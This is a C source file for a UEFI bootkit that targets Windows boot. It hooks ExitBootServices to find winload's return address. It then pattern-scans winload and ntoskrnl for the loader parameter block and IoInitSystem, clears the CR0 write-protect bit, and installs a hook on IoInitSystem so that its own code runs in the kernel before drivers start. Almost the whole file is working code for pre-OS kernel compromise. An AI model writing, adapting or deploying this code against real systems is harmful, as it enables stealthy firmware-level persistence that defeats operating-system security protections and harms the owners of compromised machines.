#include "nt.h"
#include "hook.h"
#include "drv.h"

extern EFI_RUNTIME_SERVICES* gRT;
extern EFI_BOOT_SERVICES* gBS;
EFI_EXIT_BOOT_SERVICES    gOriginalEBS;

VOID* gKernelBase = NULL;
VOID* WinloadReturnAddress = NULL;

UINT32(*IoInitSystem)();

VOID EFIAPI NotifySetVirtualAddressMap(EFI_EVENT Event, VOID* Context)
{
    /*
        winload!OslpLogOsLaunch+0x21:
        00000000`0090f949 488b83f0000000  mov     rax,qword ptr [rbx+0F0h]
        00000000`0090f950 4c8b88c0090000  mov     r9,qword ptr [rax+9C0h]
        00000000`0090f957 48b877be9f1a2fdd2406 mov rax,624DD2F1A9FBE77h
        00000000`0090f961 49f7e1          mul     rax,r9
        00000000`0090f964 488b050d241e00  mov     rax,qword ptr [winload!OslLoaderBlock (00000000`00af1d78)]
    */
    UINT8 LogSig[] = { 0x48, 0xB8, 0x77, 0xBE, 0x9F, 0x1A, 0x2F, 0xDD }; // Signature around OslpLogOsLaunch+0x21 which has the move containing the LoaderBlock
    UINT8 LogMsk[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; // All bytes are significant.
    UINT64 LogOsLaunchScanBase = (UINT64)FindPattern(WinloadReturnAddress, 0x10000, LogSig, sizeof(LogSig), LogMsk);

    PLOADER_PARAMETER_BLOCK LoaderBlock = *(PLOADER_PARAMETER_BLOCK*)(*(UINT32*)(LogOsLaunchScanBase + 0x10) + LogOsLaunchScanBase + 0x14);
    if (LoaderBlock == NULL)
    {
        Print(L"[-] LPB was null, crashing on purpose.");
        return;
    }

    KLDR_DATA_TABLE_ENTRY* KernelEntry = GetKernelModuleFromList(&LoaderBlock->LoadOrderListHead, L"ntoskrnl.exe");
    gKernelBase = KernelEntry->ModuleBase;

    // Disable write protection
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ull);

    /*
        nt!IoInitSystem:
        fffff804`7d64a6fc 4883ec28        sub     rsp,28h
        fffff804`7d64a700 488d0541482000  lea     rax,[nt!IopInitFailCode (fffff804`7d84ef48)]
        fffff804`7d64a707 4889442438      mov     qword ptr [rsp+38h],rax
        fffff804`7d64a70c e83b88ffff      call    nt!IoInitSystemPreDrivers (fffff804`7d642f4c)
        fffff804`7d64a711 84c0            test    al,al
        fffff804`7d64a713 0f8425740300    je      nt!IoInitSystem+0x37442 (fffff804`7d681b3e)  Branch

        nt!IoInitSystem+0x1d:
        fffff804`7d64a719 4c8b1570ee6eff  mov     r10,qword ptr [nt!_imp_WerLiveKernelInitSystem (fffff804`7cd39590)]
        fffff804`7d64a720 e8eb28a200      call    werkernel!WerLiveKernelInitSystemExt (fffff804`7e06d010)
        fffff804`7d64a725 e822b50000      call    nt!IopInitializeSystemDrivers (fffff804`7d655c4c)
        fffff804`7d64a72a 85c0            test    eax,eax
        fffff804`7d64a72c 0f8413740300    je      nt!IoInitSystem+0x37449 (fffff804`7d681b45)
    */

    UINT8 IoInitSysSig[] = { 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x38, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x84 }; // Start of IoInitSystem in ntoskrnl.exe
    UINT8 IoInitSysMsk[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00 };
    UINT8* IoInitSysScanBase = (UINT8*)FindPattern(gKernelBase, 0x1000000, IoInitSysSig, sizeof(IoInitSysSig), IoInitSysMsk) + 0x29;

    IoInitSystem = (UINT32(*)(UINT64, UINT64, UINT64, UINT64))(IoInitSysScanBase);
    SetupIoInitSystemHook((UINT8*)IoInitSystem, (VOID*)IoInitSystemHook);

    AsmWriteCr0(cr0);
    return;
}


EFI_STATUS EFIAPI ExitBootServicesHook(IN EFI_HANDLE ImageHandle, IN UINTN MapKey)
{
    Print(L"[*] EBS hook triggered, gathering Winload return address\n");

    gBS->ExitBootServices = gOriginalEBS;
    Print(L"[*] Handing back control to unmodified EBS @ 0x%lx\n", gOriginalEBS);

    WinloadReturnAddress = _ReturnAddress();
    Print(L"[+] Found Winload return address: 0x%lx\n", WinloadReturnAddress);

    Print(L"\n[*] We are now waiting for the virtual address space. See ya in the kernel!\n");
    return gOriginalEBS(ImageHandle, MapKey);
}


EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE* SystemTable)
{
    Print(L"[*] Hello, world!\n");
    Print(L"[*] Our handle is 0x%lx\n", ImageHandle);
    Print(L"[*] System table: 0x%lx\n", SystemTable);

    gOriginalEBS = gBS->ExitBootServices;

    // Disable write protection
    UINT64 cr0 = AsmReadCr0();
    AsmWriteCr0(cr0 & ~0x10000ull);

    gBS->ExitBootServices = ExitBootServicesHook;
    Print(L"[+] ExitBootServices hook installed: 0x%lx\n", gBS->ExitBootServices);

    AsmWriteCr0(cr0);

    EFI_EVENT addressSpaceEvent = { 0 };
    Print(L"[*] Subscribing to EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE\n");
    return gBS->CreateEvent(EVT_SIGNAL_VIRTUAL_ADDRESS_CHANGE, TPL_NOTIFY, NotifySetVirtualAddressMap, NULL, &addressSpaceEvent);
}
